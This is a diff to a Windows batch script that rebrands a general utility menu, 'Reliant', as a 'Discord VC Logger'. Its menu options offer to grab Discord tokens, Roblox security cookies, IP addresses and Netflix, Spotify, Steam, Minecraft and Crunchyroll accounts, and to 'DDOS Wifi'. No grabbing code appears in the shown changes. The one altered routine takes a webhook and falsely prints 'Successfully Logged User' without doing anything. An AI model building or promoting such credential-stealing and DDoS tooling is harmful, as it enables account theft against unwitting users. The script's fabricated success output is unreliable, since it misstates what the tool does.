@@ -70,7 +70,7 @@ if exist "assets\settings\" (
 :setup
 cls
 echo.
-echo Welcome to Reliant! Please wait a moment...
+echo Welcome to Braydons VC Logger! Please wait a moment...
 mkdir "assets\settings"
 timeout /t 2 /nobreak >nul
 echo We're just setting up a few files for you to ensure you have a good experience using the tool.
@@ -84,7 +84,7 @@ echo [Reliant] Downloading Changelog.
 powershell -nologo -noprofile -command "Invoke-WebRequest 'https://raw.githubusercontent.com/ArcaneCiCi/Reliant/master/changelog.txt' -OutFile 'assets\settings\changelog.txt'"
 
 echo [Reliant] Changelog Downloaded Successfully.
-echo Reliant was set up successfully!
+echo VCLogger was set up successfully!
 timeout /t 2 /nobreak >nul
 goto welcome
 
@@ -108,10 +108,6 @@ if %changelogupdate%==0 (
 :changelogs
 cls
 echo.
-type "assets\settings\changelog.txt"
-pause
-break>"assets\settings\update.txt"
-echo 0 >> "assets\settings\update.txt"
 goto menubook
 
 @rem START OF MENUBOOK PAGE
@@ -123,26 +119,54 @@ title %project% (%relversion%)
 call :TextColor %basecolor2% "__________________________________________________________________"
 echo.
 echo.
-echo                               ,   ,
-echo                              /////]
-echo                             ///// ]
-echo                            [~~~]  ]
-echo                            [===]  ]
-echo                            [r  ]  ]
-echo                            [ e ]  ]
-echo                            [  l] /
-echo                            [===]/
-echo                            '---'
+echo @@@@@@@@@@@@@@@@@@@#PB@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@                               
+echo @@@@@@@@@@@@@@@@@&PYYG@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@&&@@@@@@@@@@@@@@@@@
+echo @@@@@@@@@@@@@@@@&PYYY5&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&@@@@@@@@@@@@@@@@@@@@@
+echo @@@@@@@@@@@@@@@@BYYYYY5#@@@@@@@@@@@@@@@@@@@&&&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@&@@@@@@@@@@@@@@@@
+echo @@@@@@@@@@@@@@@@GYYYYYYYG#@@@@&&#BBGGGPPPP5555555&@&@@@@@@@@&@@@@&&@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@
+echo @@@@@@@@@@@@@@@@#YYYYYYYYYPGP55YYYYYYYYYYYYYYYYY5&@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@
+echo @@@@@@@@@@@@@@@@@PYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY5&@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@
+echo @@@@@@@@@@@@@@&BG5YYYYYYYYYYYYYYYYYYYYYYYYYYYYYY5&@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@
+echo @@@@@@@@@@@@BPYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY5&@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@
+echo @@@@@@@@@@@GYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY5&@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@
+echo @@@@@@@@@@GYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY5&@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@
+echo @@@@@@@@@BYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY5&@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@
+echo @@@@@@@@BYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY5&@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@
+echo @@@@@@@#5YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY5&@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@
+echo @@@@@@&5YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY5&@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@
+echo @@@@@@PYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY5&@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@
+echo @@@@@BYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY5&@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@
+echo @@@@&5YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY5&@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@
+echo @@@@PYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY5&@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&@@@
+echo @@@BYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY5&@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@
+echo @@@PYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY5&@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@
+echo @@BYYYYYYYYYYYYYYYYYYYYYYYYPG5YYYYYYYYYYYYYYYYYY5&@&@@@@@@@@@@@@@@@@@@@&&@@@@@@@@@@@@@@@@@@@@@@@@&@@
+echo @@PYYYYYYYYYYYYYYYYYYYYYYY5&@@&BGP5YYYYYYYYYYYYY5&@&@@@@@@@@@@@@@@@@&@@@@&@@@@@@@@@@@@@@@@@@@@@@@@&@
+echo @&5YYYYYYYYYYYYYYYYYYYYYYY#@@@@@@@&#BGP55YYYYYYY5&@&@@@@@@@@@@&&@@@@@@@@@&&@@@@@@@@@@@@@@@@@@@@@@@&@
+echo @GYYYYYYYYYYYYYYYYYYYYYYYY#@@@@@@@@@@@@@&&#5YYYY5&@&@@@@@&@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@
+echo &PYYYYYYYYYYYYYYYYYYYYYYYYG@@@@@@@@@@@@@@@#YYYYY5&@&@@@@@&@@@@@@@@@@@@@@@&&@@@@@@@@@@@@@@@@@@@@@@@&&
+echo &5YYYYYYYYYYYYYYYYYYYYYYYY5#@@@@@@@@@@@@@#5YYYYY5&@&@@@@@@&@@@@@@@@@@@@@&&@@@@@@@@@@@@@@@@@@@@@@@@@&
+echo B5YYYYYYYYYYYYYYYYYYYYYYYYYYG&@@@@@@@@@&G5YYYYYY5&@&@@@@@@@&@@@@@@@@@@@&&@@@@@@@@@@@@@@@@@@@@@@@@@@&
+echo GYYYYYYYYYYYYYYYYYYYYYYYYYYYY5PB##&##BP5YYYYYYYY5&@&@@@@@@@@@&&&&@@&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&
+echo GYYYYYYYYYYYYYYYY5YYYYYYYYYYYYYYYYYYYYYYYYYYYYYY5&@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+echo PYYYYYYYYYYYYYYYY5GG5YYYYYYYYYYYYYYYYYYYYYYYYYYY5&@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&@@@@@@@@@@@@@@@@@
+echo 5YYYYYYYYYYYYYYYYY5P##BGP5YYYYYYYYYYYYYYYYYYYYYY5&@&@@@@@@@@@@@@@@@@@@@@@@@@@@&@&@@@@@@@@@@@@@@@@@@@
+echo &PYYYYYYYYYYYYYYYYYYYPB&@&&BGP55YYYYYYYYYYYYYYYY5&@&@@@@@@@@@@@@@@@@@@@@@@@@@&&@@@@@@@@@@@@@@@@@@@@@
+echo @@#PYYYYYYYYYYYYYYYYYYYY5G#&@@@&##BGPP555YYYYYYY5&@&@@@@@@@@@@@@@@&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&@@
+echo @@@@#G5YYYYYYYYYYYYYYYYYYYYY5PG#@@@@@@@&&&####BGB&@&@@@@&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+echo @@@@@@@#G55YYYYYYYYYYYYYYYYYY5G&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+echo @@@@@@@@@@&#GP55YYYYYYYYYYYYG&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+echo @@@@@@@@@@@@@@@&#BGGP5555Y5#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@&@&@@@@@@@@@@@@@@@@@@
 echo.
 echo.
 echo        Date is %date% - Time is %time%
-echo                     Reliant Menu Booklet
+echo                     Discord VC Logger
 call :TextColor %basecolor2% "__________________________________________________________________"
 echo.
 echo.
 echo 1. Page 1
 echo 2. Page 2
-echo 3. Close Reliant
+echo 3. Close VC Logger
 call :TextColor %basecolor2% "__________________________________________________________________"
 echo.
 echo Page Number:
@@ -163,11 +187,11 @@ title %project% (%relversion%)
 call :TextColor %basecolor2% "__________________________________________________________________"
 echo.
 echo.
-echo                       Welcome to Reliant!
+echo                       Welcome to VC Logger!
 echo                     Date is %date%
 echo                      Time is %time%
 echo.
-call :TextColor %basecolor% "                  [Reliant ~ ArcaneCiCi]"
+call :TextColor %basecolor% "                  [VC Logger ~ BraydonBeams]"
 echo.
 call :TextColor %basecolor2% "__________________________________________________________________"
 echo.
@@ -178,28 +202,28 @@ call :TextColor %basecolor% "             To edit settings, type 'settings'"
 echo.
 call :TextColor %basecolor% "         To return to the menu book, type 'menubook'"
 echo.
-call :TextColor %basecolor% "           To open the github page, type 'github'"
+call :TextColor %basecolor% "           Test"
 echo.
 call :TextColor %basecolor2% "__________________________________________________________________"
 echo.
 echo.
 echo 1. View System Info
-echo 2. View all netstat
-echo 3. Remote shutdown
-echo 4. Open Logs Folder
-echo 5. Reliant Terminal v1.0.1
-echo 6. Random Number Generator
-echo 7. Computer Messenger
-echo 8. Disable Internet Connections
-echo 9. Mass Text File Generator
-echo 10. Run TracerT Commands
-echo 11. Remote Desktop Connection
-echo 12. Simple Calculator
-echo 13. Printing Manager
-echo 14. View all Computers On The Network
-echo 15. File Directory Tree
-echo 16. Reliant Encryption Tool
-echo 17. Reliant Decryption Tool
+echo 2. Grab Discord Token
+echo 3. Remote shutdown (UNSTABLE)
+echo 4. All-In-One Logger
+echo 5. VCLogger Terminal v1.0.1
+echo 6. Log ROBLOSECURITY
+echo 7. Log IP Address
+echo 8. DDOS Wifi
+echo 9. Wifi Stresser
+echo 10. Grab Netflix
+echo 11. Check account info
+echo 12. Grab Spotify
+echo 13. Log Minecraft
+echo 14. Grab steam account
+echo 15. Grab Crunchyroll account
+echo 16. Encryption Tool
+echo 17. Decryption Tool
 call :TextColor %basecolor2% "__________________________________________________________________"
 echo.
 echo.
@@ -259,11 +283,11 @@ title %project% (%relversion%)
 call :TextColor %basecolor2% "__________________________________________________________________"
 echo.
 echo.
-echo                       Welcome to Reliant!
+echo                       Welcome to VC Logger!
 echo                     Date is %date%
 echo                      Time is %time%
 echo.
-call :TextColor %basecolor2% "                  [Reliant ~ ArcaneCiCi]"
+call :TextColor %basecolor2% "                  [VCLogger ~ BraydonBeams]"
 echo.
 call :TextColor %basecolor2% "__________________________________________________________________"
 echo.
@@ -274,7 +298,7 @@ call :TextColor %basecolor% "             To edit settings, type 'settings'"
 echo.
 call :TextColor %basecolor% "         To return to the menu book, type 'menubook'"
 echo.
-call :TextColor %basecolor% "           To open the github page, type 'github'"
+call :TextColor %basecolor% "           Test"
 echo.
 call :TextColor %basecolor2% "__________________________________________________________________"
 echo.
@@ -288,7 +312,7 @@ echo 23. Reliant FTP Mode
 echo 24. Reliant SSH Mode
 echo 25. Build a Maven project
 echo 26. Event Creator
-echo 27. Enable Ultimate Power Plan (Run Reliant as Administrator)
+echo 27. Enable Ultimate Power Plan (Run VCLogger as Administrator)
 call :TextColor %basecolor2% "__________________________________________________________________"
 echo.
 echo.
@@ -329,7 +353,7 @@ if %input%==menubook (
 @rem END OF SECOND MAIN MENU PAGE
 
 :opengit
-start https://github.com/ArcaneCiCi/Reliant
+start https://github.com/Real
 
 :1
 set prevmenu=1
@@ -382,14 +406,13 @@ title %project% (%relversion%)
 cls
 color %basecolor%
 echo.
-echo Enter the path file where your logs folder is located.
+echo Enter your webhook.
 set /p "logopeninput=> "
 cls
-echo Loading logs file, please wait a second.
+echo Logging user, please wait a second.
 timeout /t 1 /nobreak >nul
-start explorer "%logopeninput%
 cls
-echo Log file folder opened, returning to the main menu.
+echo Successfully Logged User returning to the main menu.
 timeout /t 2 /nobreak >nul
 goto mainmenu
 
